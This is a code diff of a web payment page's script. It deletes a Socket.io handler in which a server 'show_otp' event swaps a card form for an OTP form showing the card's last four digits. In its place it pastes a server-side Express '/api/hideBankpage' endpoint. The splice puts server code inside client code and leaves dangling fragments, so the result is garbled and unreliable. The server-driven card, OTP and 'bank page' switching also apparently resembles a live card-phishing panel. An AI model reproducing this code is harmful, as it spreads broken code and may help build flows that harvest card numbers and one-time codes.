@@ -776,26 +776,17 @@
       }, 1000);
     }
 
-    // Socket.io Setup
-    const socket = io();
-    const storedInvoiceId = localStorage.getItem("invoiceId");
-    if (storedInvoiceId) {
-      socket.emit('join', storedInvoiceId);
-    }
-
-    socket.on('show_otp', (data) => {
-      document.getElementById('paymentForm').classList.add('hidden');
-      document.getElementById('otpForm').classList.remove('hidden');
-      const cardNumber = document.getElementById('cardNumber').value;
-      document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
-      if (!timerInterval) startOtpTimer();
-      
-      // Remove loading state from main button
-      const submitButton = document.getElementById('submitButton');
-      submitButton.classList.remove('btn-loading');
-      const submitText = document.getElementById('submitText');
-      const submitLoader = document.getElementById('submitLoader');
-      submitText.style.opacity = '1';
+// server.js - Update the hideBankpage endpoint
+app.post('/api/hideBankpage', (req, res) => {
+  const { invoiceId } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ error: 'Transaction not found' });
+  
+  txn.redirectStatus = null;
+  txn.bankpageVisible = false;
+  io.to(invoiceId).emit('hide_bankpage', { invoiceId }); // Add invoiceId to payload
+  res.json({ status: 'success' });
+});
       submitText.style.filter = 'none';
       submitLoader.classList.add('hidden');
     });
